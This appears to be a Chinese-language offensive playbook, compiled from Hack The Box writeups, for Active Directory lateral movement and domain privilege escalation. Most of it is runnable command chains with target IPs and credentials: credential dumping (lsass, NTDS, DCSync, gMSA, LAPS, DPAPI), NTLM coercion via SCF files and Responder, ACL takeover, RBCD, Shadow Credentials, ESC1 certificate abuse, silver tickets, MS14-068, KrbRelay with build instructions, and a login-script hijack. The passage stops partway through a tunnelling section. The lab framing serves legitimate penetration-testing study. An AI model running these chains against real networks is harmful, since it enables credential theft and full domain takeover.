# AD 域渗透·立足后横向移动与域提权（实战方法论）

> 来源：用户博客 20+ 篇 HTB AD writeup 系列沉淀。
> 触发场景：**已获域凭据或域内 shell**，需横向移动 / 权限提升 / 收割全域（零凭据→立足见 `references/notes/ad-initial-access.md`）。核心思想：**凭据 → 权限 → 更高凭据**滚雪球——每拿一个新凭据回 §1 重跑侦察，直到 DC；BloodHound 只给一条边也够用，一条边=一类利用方式。

---

## 0. 流程总览（决策流程）

```
Step 1 立足后侦察（bloodhound-python / SharpHound 上传兜底；AD 回收站翻已删对象）
   ↓
Step 2 凭据收割（按密文位置：内存 lsass / NTDS 离线 / 强制认证捕 NTLMv2 / gMSA / LAPS / DPAPI）
   ↓
Step 3 按手上权限选提权路：
   ACL 边（ForceChangePassword / Account Operators / Owner / GenericWrite / RBCD）→ §3
   ADCS 模板 ENROLLEE_SUPPLIES_SUBJECT → §4
   特权/协议（SeBackupPrivilege / MS14-068 / 银票 / NTLMv1）→ §5
   ↓
Step 4 出口全封（邮件明示 WinRM 不外露 + TCP/UDP/ICMP 全封）→ §6 域内隧道落地
   ↓
Step 5 服务密文（Jenkins / VNC 注册表 / ERRORLOG / pfx）→ §7 离线解密，回 Step 2 继续
```

分界：本文件只讲**域内**横向与域提权；shell 之后的**本机提权**见 `references/notes/privesc-linux-windows.md`。

### 0.1 Kerberos-only 域的通用纪律（HTB-Absolute 实测踩坑后固化）

1. **PAC 时序**：**组员身份**在 **TGT 签发时**写进 PAC，所以**改完组员必须重新取票**，否则出现"AD 里明明入组成功了、操作仍被拒"——典型是写 `msDS-KeyCredentialLink` 报 `INSUFF_ACCESS_RIGHTS`（该权限由新组的 ACE 授予），或已加入 `Administrators` 但登录令牌里没有管理员组。
   ⚠️ **反例边界**：改的是**对象侧 ACL/DACL**（给别人或自己补 ACE）时**不需要**换票——授权判定看对象 DACL，不看你的 PAC。本案实证：`dacledit` 自补 `FullControl` 后，`bloodyad` 用**入组前签发的旧票**就成功写入了组成员。
   **判据：任何"权限已改却报权限不足"的现象，先分清"改的是我的身份（换票）还是对象的 ACL（不用换票）"。**
2. **一次跑完**：目标可能存在**周期性状态还原**（实测被重置的是**组员身份与 owner**：11:55 验证 `m.lovegod` 已在组内，12:05 之前复查已消失且读不出 SD，**窗口 ≤10 分钟**；DACL 是否同步回滚未直接观测，按"一并失效"处理即可）。带状态变更的链（owneredit → dacledit → 入组 → 重新取票 → Shadow Credentials）要**单次连续执行**——实测 37 秒连跑 5 步全绿，中途停顿则前功尽弃，且报错与"本来就没权限"无法区分。
3. **BH 边可能过期**：`Owns` 边只是采集时刻的 owner 字段。动手前读目标的 `nTSecurityDescriptor` 实锤——**在已正确请求该属性的前提下读不到它 = 当前不是 owner**（owner 隐含 `READ_CONTROL`；反向不成立：非 owner 也可能被显式授予 `READ_CONTROL` 而读到）。
4. **工具命名（Kali 打包版）**：`impacket-<name>`（没有裸 `*.py`）、`certipy-ad`（不是 `certipy`）、`bloodyad`（全小写，不是 `bloodyAD`）。名字写错会浪费一轮实验。
5. **NTLM 报错三态判读**：`STATUS_LOGON_FAILURE` = 凭据错或该域 NTLM 全禁；`STATUS_ACCOUNT_RESTRICTION` = **密码已验证正确**、仅登录方式被策略拦（Protected Users）；用 NT hash 取票报 `KDC_ERR_ETYPE_NOSUPP` = 账号在 Protected Users / 仅允许 AES，改用 ccache 或 pfx，别再拿 hash 试。
6. **执行受限主机**（AppLocker 白名单 + 防火墙按程序拦出站 + 文件被周期还原，"落地 exe 再反连"直接作废）→ Read `references/notes/windows-hardened-execution.md`：DLL 劫持四步法、宿主内执行、代码签名证书重签高权脚本、把多步链塞进 DLL 抢时间窗、DCSync-from-Windows 与 NTLM 禁用时的 overpass-the-hash。与本文件的分工：本文件负责**拿凭据/改权限**，那份负责**在执行被封的宿主里把动作真正跑起来**。

### 0.2 与 AD 链的两个接口（HTB-Hathor 实测）

- **SMB 签名强制（`Message signing enabled and required`）**：中继认证到 SMB 不成立（中继者无会话密钥、无法签名），但**不影响用有效凭据正常登录**；需要中继时把目标换成 LDAP / ADCS(HTTP) 等不校验 SMB 签名的服务。
- **拿到下一个域身份的最短路径常常是"计划任务脚本"**：若存在一个**签名过 AppLocker 的脚本**由计划任务以高权账号运行（触发方式可能是事件日志），改它 + 用泄漏的代码签名证书重签，即可借它的高权上下文执行 —— 详见上述 note §5。

## 1. 立足后侦察（BloodHound + AD 回收站）

### 1.1 采集

```bash
bloodhound-python -c All -u support -p '#00^BlackKnight' -ns 10.129.229.17 -d BLACKFIELD.local --zip
```
来源：HTB-Blackfield

- **时钟偏差自动回退 NTLM**：时差大时输出 `WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.`（来源：HTB-Blackfield）——采集照常完成；但直接走 Kerberos 的调用报 `KRB_AP_ERR_SKEW(Clock skew too great)`（来源：HTB-Forest），先对时再重试
- **DNS 超时兜底**：报 `dns.resolver.LifetimeTimeout` 时改 evil-winrm `upload SharpHound.exe` 远程收集再回传：
```powershell
.\SharpHound.exe -c All --zipfilename SharpHound
download 20260505210432_SharpHound.zip
```
来源：HTB-Object。已有交互 shell 同法 `.\SharpHound.exe -c All --ZipFilename data.zip` 后带凭据 SMB 外带（来源：HTB-Outdated）

### 1.2 最短路径 → 利用方式映射

| BloodHound 边 | 利用方式 | 见 |
|---|---|---|
| ForceChangePassword | rpcclient setuserinfo2 改密 | §3.1 |
| Account Operators（可入任意组） | 入 Exchange Windows Permissions → DCSync | §3.2 |
| WriteOwner / GenericAll | PowerView 三连夺对象控制权 | §3.3 |
| GenericAll over 用户 | 直接改密 | §3.3 |
| GenericWrite over DC/机器账号 | RBCD 三连 | §3.6 |
| DCSync 边 | impacket-secretsdump -just-dc | §3.2 |
| Owns / GenericWrite over 组（BH 显示但写操作被拒） | owneredit → dacledit → bloodyAD 入组（Linux 侧） | §3.7 |
| GenericWrite / AddKeyCredentialLink over 用户 | Shadow Credentials（certipy shadow auto，免爆破拿身份+NT hash） | §3.8 |
| 已上 WinRM 但非管理员，且 LDAP signing 未启用 | KrbRelay 中继机器账户 → 入 Administrators | §5.5 |

决策点：**一条边也够用**（Blackfield 仅 ForceChangePassword 一条边即改密拿到 forensic 共享读权）；**BloodHound 无路径≠无漏洞**——回落 PowerView `Get-DomainObjectAcl` 手查（Self/WriteProperty 类边 GUI 不一定标出），或 grep 离线 acls.csv（§3.0）。

### 1.3 AD 回收站（读已删对象）

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and name -like "*TempAdmin*"' -IncludeDeletedObjects -Properties cascadeLegacyPwd | Select-Object -ExpandProperty cascadeLegacyPwd
```
来源：HTB-Cascade

管理员删账号只删对象不清属性——已删对象的自定义属性（cascadeLegacyPwd，base64 密码）常可直接读出。拿到可疑用户名先翻回收站。

## 2. 凭据与哈希获取（按密文位置选路）

### 2.1 内存：lsass.DMP 离线分析

```bash
smbget -U 'BLACKFIELD/audit2020%P@ssword' -r smb://10.129.229.17/forensic/memory_analysis/lsass.zip
pypykatz lsa minidump lsass.DMP | tee ../lass.txt
```
来源：HTB-Blackfield

- smbclient `mget *` 拉大文件超时（NT_STATUS_IO_TIMEOUT / CONNECTION_DISCONNECTED）时换 `smbget -r` 整包下载
- **教训**：dump 出的 NT hash 必须逐个验证再默认可用——Blackfield 中 pypykatz 出的 Administrator hash 登录即 STATUS_LOGON_FAILURE（已失效）

### 2.2 NTDS 离线解（已有 ntds.dit + SYSTEM 两文件）

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | tee HASH.txt
```
来源：HTB-Blackfield。同款（备份包内相对路径）：
```bash
impacket-secretsdump -ntds ntds.dit -system ../registry/SYSTEM LOCAL | tee ../user_hash_ra
```
来源：HTB-APT——SMB 匿名 backup 共享拿 backup.zip，`zip2john backup.zip > backup_hash.txt` 破解后解出 `Active Directory/ntds.dit` 与 `registry/SYSTEM` 两文件直接离线解。两文件的取得方式见 §5.1。

### 2.3 DNS 记录注入 + Responder 捕 NTLMv2

适用：读到域内计划任务/服务脚本以 `-UseDefaultCredentials` 访问 `web*` 前缀主机名——三个利用要件全在脚本源码里（前缀过滤 + 默认凭据 + DNS 可写）。

```bash
python3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web_enil --data 10.10.16.151 -dns-ip 10.129.95.154 --type A intelligence.htb
sudo responder -I tun0
hashcat -m 5600 Users/hash /usr/share/wordlists/rockyou.txt
```
来源：HTB-Intelligence

### 2.4 强制认证三向量（让目标主动发认证到攻击机）

| 向量 | 操作 | 来源 |
|---|---|---|
| MSSQL xp_dirtree UNC | `EXEC master..xp_dirtree '\\10.10.16.151\share'` 配 responder | HTB-Escape |
| SCF 图标解析 | 上传 .scf 到可浏览目录，explorer 渲染图标时走 SMB 认证 | HTB-Driver |
| 打印机 Server Address | Web 面板 Settings 改 LDAP Server Address 为攻击机 IP | HTB-Return |

SCF 内容（来源：HTB-Driver）：
```
[Shell]
Command=2
IconFile=\\10.10.16.155\enil
[Taskbar]
Command=Test
```
配 `sudo responder -I tun0 -v` 收 NTLMv2（解析不存在的 SMB 地址时降级 NBT-NS/LLMNR，即 Responder 前提）。

打印机向量不同点：目标是**明文 LDAP 绑定**而非 hash——改完 Server Address 后 `sudo nc -lvnp 389` 直接收 `return\svc-printer` 与密码（来源：HTB-Return）。

### 2.5 gMSA 密码读取

```bash
python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb
```
来源：HTB-Intelligence（输出形如 `svc_int$:::5e47bac787e5e1970cf9acdb5b316239`）

**教训**：gMSADumper 无读取权限时只列 `Users or groups who can read password for ...` 的 ACL 不给 hash（Intelligence 首跑低权限账号即如此）——按列表换有 gMSA 读权限的账号重跑。备选：`sudo nxc ldap rebound.htb -d rebound.htb --use-kcache --gmsa`（来源：HTB-Rebound）。

### 2.6 LAPS 双路读取

路一 PowerView：
```powershell
Get-DomainComputer DC -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"
```
路二 ldapsearch（均来源：HTB-StreamIO）：
```bash
ldapsearch -x -H ldap://10.129.15.25 \
  -D 'jdgodd@streamio.htb' \
  -w 'JDg0dd1s@d0p3cr3@t0r' \
  -b 'DC=streamio,DC=htb' \
  '(cn=DC)' ms-mcs-admpwd
```
Linux 侧变体：`python laps.py -u lothbrok -p enil12408@Pass! -l 10.129.228.115 -d LicorDeBellota.htb`（来源：HTB-PivotAPI）。前提：当前账号在 LAPS 读取组——`net group /domain` 确认组成员关系（来源：HTB-PivotAPI）。

### 2.7 DPAPI：Import-Clixml 还原 PSCredential

```bash
powershell -c "$cred=Import-Clixml C:\Users\nico\Desktop\cred.xml;$cred.GetNetworkCredential().Password"
```
来源：HTB-Reel（解出 `1ts-mag1c!!!`）。同型（同机解，UserName/Password 各取一次，来源：HTB-Pov）：
```powershell
$cred = import-clixml -Path connection.xml
$cred.GetNetworkCredential().UserName
$cred.GetNetworkCredential().Password
```
桌面/文档目录的 *.xml（cred/connection 命名）先按此法试，多数是 Export-Clixml 的 PSCredential。

### 2.8 从域内 Windows 主机执行 DCSync（DSInternals，不落地工具）

```powershell
Import-Module DSInternals -ErrorAction SilentlyContinue
"IDENTITY: $(whoami)" | Out-File -Encoding utf8 C:\Programdata\dc.txt
Get-ADReplAccount -SamAccountName administrator -Server <DC FQDN> 2>&1 | Out-File -Append -Encoding utf8 C:\Programdata\dc.txt
Copy-Item C:\Programdata\dc.txt C:\<可读共享>\dc.txt -Force
```
来源：HTB-Hathor（2026-09-21 实测）

- 需要运行账号具备 `Replicating Directory Changes` / `...All` —— **口令审计类工具的运行账号通常天然具备**（工具本身就是靠复制协议读取密码哈希），无需先成为域管。
- 输出含 `NTHash`、`NTHashHistory` 与 `KerberosNew.AES256/AES128 Key`：**RC4 被禁时用 AES key 走 keytab/`ktutil` 取票**，别只留 NT hash。
- 结果先写 `C:\Programdata` 再回抄共享，避免依赖交互 shell；开头写一行 `IDENTITY: $(whoami)` 自证执行身份。
- **NTLM 禁用 ⇒ 不能 PTH**，改走 overpass-the-hash：`impacket-getTGT <domain>/Administrator -hashes :<NT> -dc-ip <ip>` → `export KRB5CCNAME=<user>.ccache` → `impacket-wmiexec -k -no-pass <domain>/Administrator@<DC FQDN>`。
- 与 §5.5 KrbRelay 的分界：**账号自己有复制权限**就直接用本节；只有"能中继机器账户"的条件时才走 §5.5。

## 3. ACL 滥用提权（BloodHound 找边后逐类打）

### 3.0 找边兜底：离线 acls.csv

BloodHound 采集产物 acls.csv 直接 grep 出链（无 GUI 也可）：
```bash
cat acls.csv| grep -i 'tom@'
cat acls.csv| grep -i 'claire@'
```
来源：HTB-Reel（tom 对 claire 有 WriteOwner、claire 对 Backup_Admins 有 WriteDacl——两跳链）

### 3.1 ForceChangePassword → rpcclient setuserinfo2

```bash
rpcclient -U 'BLACKFIELD/support%#00^BlackKnight' 10.129.229.17
rpcclient $> setuserinfo2 audit2020 23 'P@ssword'
```
来源：HTB-Blackfield。改完立即验证：`nxc smb 10.129.229.17 -u audit2020 -p 'P@ssword'`；**每拿一个新凭据重跑 `nxc smb 10.129.229.17 -u support -p '#00^BlackKnight' --shares` 重查共享权限**（audit2020 才可读 forensic）。

### 3.2 Account Operators → Exchange Windows Permissions → DCSync

svc-alfresco 在 Account Operators（可自加任意组）：
```powershell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco'
Add-DomainObjectAcl -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'svc-alfresco' -Rights DCSync -Verbose
```
来源：HTB-Forest。然后 DCSync 收割全域 + PTH：
```bash
impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@10.129.95.210 -just-dc
evil-winrm -i 10.129.95.210 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```
来源：HTB-Forest

### 3.3 PowerView 三连（Owner → ACL → 改密/入组）

夺组/对象控制权的标准三步：
```powershell
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity maria
Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity maria -Rights All
Add-DomainGroupMember -Identity 'Domain Admins' -Members maria
```
来源：HTB-Object

变体 A（跨用户两跳传导，来源：HTB-Reel）：
```powershell
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
Add-DomainObjectAcl -TargetIdentity 'Backup_Admins' -PrincipalIdentity claire -Rights WriteMembers
Add-DomainGroupMember -Identity 'Backup_Admins' -Members claire
```
变体 B（Linux/其他上下文带凭据操作时加 `-Credential $Cred` 三参数同型，来源：HTB-StreamIO）。

### 3.4 GenericAll → 直接改密

```powershell
$pw=ConvertTo-SecureString 'P@sswOrd' -AsPlainText -Force
Set-DomainUserPassword -Identity smith -AccountPassword $pw
```
来源：HTB-Object

### 3.5 scriptpath 劫持（等下次登录触发）

```powershell
Set-DomainObject -Identity maria -SET @{scriptpath='C:\programdata\apps\foo.ps1'}
```
来源：HTB-Object——改登录脚本路径，目标用户下次登录执行，用于偷其桌面文件（对持有敏感文件的用户，比直接改密更隐蔽）。

### 3.6 RBCD 三连（GenericWrite over DC/机器账号）

```bash
impacket-addcomputer -computer-name 'PWN$' -computer-pass '123456' -dc-ip 10.129.23.95 'support.htb/support:Ironside47pleasure40Watchful'
impacket-rbcd -delegate-from 'PWN$' -delegate-to 'DC$' -action 'write' -dc-ip 10.129.23.95 'support.htb/support:Ironside47pleasure40Watchful'
impacket-getST -spn 'cifs/DC.support.htb' -impersonate 'Administrator' -dc-ip 10.129.23.95 'support.htb/PWN$:123456'
impacket-wmiexec -k -no-pass -target-ip 10.129.23.95 dc.support.htb
```
来源：HTB-Support。要点：新建机器账号 PWN$ 当"委派来源"，对 DC$ 写 msDS-AllowedToActOnBehalfOfOtherIdentity，再以 PWN$ 身份冒充 Administrator 取 cifs 票据，最后 `wmiexec -k -no-pass` 直达 DC。

### 3.7 ACL 接管链：owneredit → dacledit → bloodyAD（BH 边过期时的 Linux 侧实测路径）

**触发**：BH 显示 `A → Owns → 组`，但写操作被拒（`insufficientAccessRights`）。先实锤 owner（只读；判据见 §0.1 第 3 条）：

```bash
ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b 'DC=absolute,DC=htb' -LLL \
  '(cn=Network Audit)' nTSecurityDescriptor member
```

三步接管并入组（每步都在改域状态，按 §0.1 第 2 条一次跑完）：

```bash
impacket-owneredit -k -no-pass 'absolute.htb/m.lovegod' -dc-ip dc.absolute.htb \
  -new-owner m.lovegod -target 'Network Audit' -action write
impacket-dacledit -k -no-pass 'absolute.htb/m.lovegod' -dc-ip dc.absolute.htb \
  -principal m.lovegod -target 'Network Audit' -action write -rights FullControl
bloodyad --host dc.absolute.htb -d absolute.htb -k add groupMember 'Network Audit' m.lovegod
impacket-getTGT 'absolute.htb/m.lovegod:<口令>' -dc-ip 10.129.232.60   # 入组后必须重取票
```

来源：HTB-Absolute（执行顺序与官方 writeup 一致）

- **为什么 owneredit 必须在前**：owner 身份隐含 `READ_CONTROL` + `WRITE_DAC`，但**不直接给"写 member 属性"的权**；dacledit 先给自己补 `FullControl`，bloodyAD 才有权改 `member`。省掉这两步直接入组 = `insufficientAccessRights`。
- **实现细节（源码核对：impacket 0.14.0.dev0 `examples/dacledit.py`）**：`FullControl` 掩码定义为 `0xf01ff`（`SIMPLE_PERMISSIONS.FullControl`），写入方式是读出目标 `nTSecurityDescriptor`、追加 ACE 后以 LDAP `MODIFY_REPLACE` 整体写回——**所以 dacledit 自己也需要 `READ_CONTROL`**（与 §0.1 第 3 条同源）。
- 取值以 `-h` 为准（已核对）：`-action {read,write,remove,backup,restore}`、`-rights {FullControl,ResetPassword,WriteMembers,DCSync,Custom}`（默认 `FullControl`）。
- **回滚**：`write` / `remove` / `restore` 前都会自动生成 `dacledit-<YYYYmmdd-HHMMSS>.bak`（JSON，含原 SD 的 hex 与目标 DN），回滚执行：
```bash
impacket-dacledit -k -no-pass 'absolute.htb/m.lovegod' -dc-ip dc.absolute.htb -action restore -file dacledit-<ts>.bak
```
- `-principal` 是**被授权方**，`absolute.htb/<user>` 是**认证身份**，是两个不同的参数位（自授权时同名，容易误读）。
- 与 §3.3 分工：§3.3 是 Windows/PowerView 三连，本节是 Linux/impacket + bloodyAD——同一目标的两种打法。

### 3.8 Shadow Credentials（msDS-KeyCredentialLink）

**原理**：向目标账号的 `msDS-KeyCredentialLink` 写入攻击者公钥 → KDC 接受 PKINIT（证书）认证 → 以该账号身份取 TGT → 解 PAC 得 NT hash（UnPAC the hash）。**不需要口令、不需要爆破**，一步拿到身份。 `auto` 模式的执行顺序由源码写死（certipy 5.0.4 `commands/shadow.py` docstring：add a Key Credential → authenticate → get NT hash → **restore original state**），并在结束时**恢复写入前的原始值**。

**前提**：对该属性有写权（`GenericWrite` / `AddKeyCredentialLink` / `GenericAll`）；域支持 PKINIT（有 ADCS / KDC 证书）。

```bash
certipy-ad shadow auto -k -no-pass -u 'absolute.htb/m.lovegod@dc.absolute.htb' \
  -dc-ip 10.129.232.60 -dc-host dc.absolute.htb -target dc.absolute.htb -account winrm_user
# 成功：写入 Key Credential → PKINIT 取 TGT → 输出 <account>.ccache + NT hash
# 结尾自动恢复写入前的原始 Key Credentials（源码流程保证；输出 Successfully restored）
```

来源：HTB-Absolute

- `-u` = **认证身份**（当前持有的账号），`-account` = **被接管账号**，必须区分。
- Kerberos 认证时显式加 `-dc-host <DC 主机名>`，否则告警 `DC host (-dc-host) not specified and Kerberos authentication is used. This might fail`。
- 目标 ccache 已存在时会**交互询问是否覆盖** → 脚本/管道环境先 `rm -f <account>.ccache`，否则卡死。
- 失败 `00002098 INSUFF_ACCESS_RIGHTS` = PAC 未更新或 ACL 已被还原（§0.1 第 1、2 条）；**失败那次的 KeyCredential 未写入 AD**，直接重跑不留脏。
- **PKINIT 不受 Protected Users 限制**：本案 `winrm_user` 在 Protected Users（禁 NTLM、禁 RC4），该攻击照样成功（实测）——不要因为目标在 Protected Users 组就排除这条路。
- 检测视角：`msDS-KeyCredentialLink` 的写入在 5136（目录服务变更）里是强特征（标准 AD 审计事件，本档未实测）；且因结尾自动还原，事后回溯困难。

## 4. ADCS 证书攻击（ESC1）

四步链（来源：HTB-Escape 全链）：

1. 发现 CA 与模板：
```bash
nxc ldap sequel.htb -u ryan.cooper -p NuclearMosquito3 -M adcs
```
2. 找漏洞模板——判据 `msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT`（=ESC1，申请者可自定 SAN）：
```powershell
.\Certify.exe find /vulnerable /currentuser
```
3. 以 administrator 为 altname 申请，输出 cert.pem 后按 Certify 提示转 pfx：
```powershell
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```
```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
4. Rubeus 用 pfx 申请 TGT 并直接出 NTLM，然后 PTH：
```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\apps\cert.pfx /getcredentials /show /nowrap
```
```bash
evil-winrm -i sequel.htb -u administrator -H A52F78E4C751E5E17E1E9F3E58F4EE
```

## 5. 域管直达路径（无需 ACL 边的直线）

### 5.1 SeBackupPrivilege 三件套（whoami /priv 见 SeBackupPrivilege 即用）

Kali 制作 diskshadow 脚本（`\r\n` 行尾，上传后 Format-Hex 校验）：
```bash
printf 'set context persistent nowriters\r\nadd volume c: alias cdrive\r\ncreate\r\nexpose %%cdrive%% z:\r\n' > dshadow.txt
```
上传目标执行后 C 盘卷影暴露为 Z:，备份模式取两文件并回传：
```powershell
robocopy /b Z:\Windows\NTDS C:\programdata\apps\ntds ntds.dit
reg save HKLM\SYSTEM C:\programdata\apps\ntds\SYSTEM
download ntds.dit
download SYSTEM
```
离线解 + PTH（来源：HTB-Blackfield 全链）：
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | tee HASH.txt
evil-winrm -i 10.129.25.101 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

### 5.2 goldenPac（MS14-068 一体化）

```bash
impacket-goldenPac -dc-ip 10.129.26.112 htb.local/james:'J@m3s_P@ssW0rd!'@mantis.htb.local
```
来源：HTB-Mantis——MS14-068 伪造 + PsExec 一体化直接拿 SYSTEM（适用：持有普通域账号密码、域未打 MS14-068 补丁的老环境）。

### 5.3 银票（impacket-ticketer，只需服务账户 NTLM + domain-sid）

```bash
impacket-getPac -targetUser administrator scrm.local/sqlsvc:Pegasus60
impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn "MSSQLSvc/DC1.scrm.local:1433" -user-id 500 -groups 512,513,518,519,520 administrator
```
来源：HTB-Scrambled——getPac 取 domain-sid，ticketer 以 sqlsvc 的 NTLM 给 MSSQLSvc 伪造 user-id 500（administrator）票据，后续 `impacket-mssqlclient -k -no-pass` 以管理员身份操作。

**身份语义坑**：落地后 `EXEC xp_cmdshell 'whoami'` 返回 `scrm\sqlsvc` 而非 administrator——银票伪造的是**登录身份**（SQL 权限层面：`SELECT SYSTEM_USER` = `SCRM\administrator`、`IS_SRVROLEMEMBER('sysadmin')` = 1），进程仍以服务账号运行。判定利用是否成功看 SQL 层权限查询，**不要**因 whoami 是服务账号就误判失败。

### 5.4 NTLMv1 降级破解（破出即 NT hash，可直接 PTH）

```bash
python3 ntlmv1.py --ntlmv1 'APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788'
```
来源：HTB-APT——challenge 固定 `1122334455667788` 时可拆 DES 密钥对再爆：
```bash
echo "95ACA8C7248774CB:1122334455667788">>14000.hash
echo "427E1AE5B8D5CE68:1122334455667788">>14000.hash
hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1
```

### 5.5 KrbRelay：中继机器账户到 LDAP → 入 Administrators（WinRM 非交互会话专用）

**场景**：已拿到 WinRM 登录（Remote Management Users）但**不是管理员**，且域控的 `Domain controller: LDAP server signing requirements` 未设为 Require（旧版默认安装即如此；微软近年逐步推进默认强制签名）。**判定方式**：走一次中继即可知——设为 Require 时中继发起的 LDAP bind 会被直接拒绝，**走不到输出里的 `[+] LDAP session established`**（本档未附策略查询命令，以实测症状为准）。

```powershell
cd C:\programdata\Apps   # 会话起始目录通常是 C:\Users\<user>\Documents，不切目录 .\Tool.exe 会 not recognized
.\CheckPort.exe          # 找防火墙允许 SYSTEM 使用的端口（HTB-Absolute 实测返回 10）

.\RunasCs.exe winrm_user -d absolute.htb TotallyNotACorrectPassword -l 9 "C:\programdata\Apps\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10 -add-groupmember Administrators winrm_user"
# 成功标志：[*] Relaying context: absolute.htb\DC$ → [+] LDAP session established → [*] ldap_modify: LDAP_SUCCESS
net localgroup administrators     # 成员出现 winrm_user 即成功
```

来源：HTB-Absolute

- **必须经 RunasCs 启动**：WinRM（PS remoting）会话不是交互会话、内存里没有用户凭据，**官方 writeup 中直接运行 KrbRelay 报 `Access Denied`**（本案按官方姿势直接用 RunasCs，未复现裸跑失败）。
- `-l 9` 是 **logon type 9**（≈ `runas /netonly`，**不校验口令**，所以可填假口令），**不是 session id**；KrbRelay 侧的 `-session <id>` 才是跨会话编组参数。
- **`-add-groupmember <GROUP> <USER>` 必须显式写出**：官方 writeup 正文未体现该参数，但 `KrbRelay.exe -h` 实测列出该子命令（同族还有 `-shadowcred` / `-rbcd` / `-reset-password` / `-console` / `-laps` / `-gMSA`）。
- 加完组**必须重新取票**，否则登录令牌里仍没有管理员组（§0.1 第 1 条）。
- CLSID 用 TrustedInstaller 的 `8F5DF053-3013-4dd8-B5F4-88214E81C0CF`（该 Windows 版本实测可用）；端口取 CheckPort 输出。
- **为什么能成功**：中继到的身份是**域控自身的机器账户**（成功输出里那行 `Relaying context: absolute.htb\DC$`），它在域内权限极高，所以随后的 LDAP 修改（把当前用户写进 `Administrators`）被允许——这也是该路径无需任何 ACL 边的原因。

**另一种用法——跨会话抓 NTLM**（来源：HTB-Rebound 博客原文）：目标存在交互会话时（`Get-Process` 的 SI 列 = 1，如 explorer/ctfmon），用 `-ntlm -session <id>` 让指定会话内的用户发起认证，抓其 NetNTLMv2 离线破解：

```powershell
.\RunasCs.exe oorend '<口令>' -l 9 "c:\programdata\apps\KrbRelay.exe -ntlm -session 1 -clsid 38e441fb-3d16-422f-8750-b2dacec5cefc -port 95"
# 输出 NTLM3 <user>::<domain>:... 即 NetNTLMv2 → hashcat -m 5600
```

**工具自建（本机实测配方）**：官方仓库**未提供可直接下载的编译产物**（本次探测：`/releases` 页面无任何下载项、`bin/Release/*.exe` 均 404；官方 writeup 亦是在 Windows 上用 VS 自行编译），Linux 侧从源码编译可行：

```bash
git clone --depth 1 https://github.com/cube0x0/KrbRelay /tmp/krs
# 仓库自带 packages/（BouncyCastle 1.8.9、MimeKitLite 2.15.1、System.Buffers 4.5.1、ILMerge），第三方依赖无需从 NuGet 拉取
# 注意：net472 目标包 Microsoft.NETFramework.ReferenceAssemblies 仍需联网 restore 一次
```

用 SDK 风格工程以 `TargetFramework=net472` 编译（`<Compile>` / `<EmbeddedResource>` 列表直接取自原 `KrbRelay.csproj`），五个必配点（标 ※ 的两项为**预防性设置**，未实测报错）：

| 坑 | 现象 | 解法 |
|---|---|---|
| 缺框架引用 | `System.Net.Http` / `System.DirectoryServices` 命名空间不存在 | 显式加 `System.Net.Http`、`System.DirectoryServices`、`System.Numerics`、`System.Data`、`Microsoft.CSharp` |
| HintPath 相对路径 | MimeKit / NetFwTypeLib 引用静默失效 | 引用一律写**绝对路径**（相对路径按 csproj 所在目录解析） |
| MimeKitLite 目标框架 | `MSB3274`：net48 版高于目标 net472 | 改用该包 `lib/netstandard2.0` 那份 DLL |
| ※ COM 引用 | 原工程 `<COMReference Include="NetFwTypeLib">` 在 Linux 上无法解析 | 改用仓库内现成的 `CheckPort/obj/Release/Interop.NetFwTypeLib.dll` 作普通引用 |
| ※ 程序集属性 / dotnet HOME | 预防项：AssemblyInfo 重复定义；实测报 `The user's home directory could not be determined` | `GenerateAssemblyInfo=false` + `EnableDefaultCompileItems=false`；`export DOTNET_CLI_HOME=/tmp/dnhome HOME=/tmp/dnhome` |

```bash
dotnet build KrbRelay.csproj -c Release   # 产出 KrbRelay.exe(≈662KB) + CheckPort.exe(≈6.6KB)
```

产物目录必须同时带上 4 个运行时依赖：`BouncyCastle.Crypto.dll`、`MimeKitLite.dll`、`System.Buffers.dll`、`Interop.NetFwTypeLib.dll`——**缺任一个即 `FileNotFoundException`**（CheckPort 最先报缺 `Interop.NetFwTypeLib`）。

## 6. 域内隧道与受限出口

### 6.1 出站防火墙判断

优先读内部邮件/公告——常直接写明（来源：HTB-PivotAPI 原文："we have decided to stop externally displaying WinRM's service... we have also blocked the TCP, UDP and even ICMP output"）。出现"WinRM 不外露 + TCP/UDP/ICMP 出口全封"即放弃反弹 shell，改走落地隧道（有 MSSQL 等落地服务可登时优先 mssqlproxy）。

### 6.2 mssqlproxy SOCKS 隧道（MSSQL 落地 → 域内 WinRM）

MSSQL 会话内（来源：HTB-PivotAPI）：
```
SQL> enable_ole
SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
```
Kali 侧安装 CLR 并启动（监听 1337）：
```bash
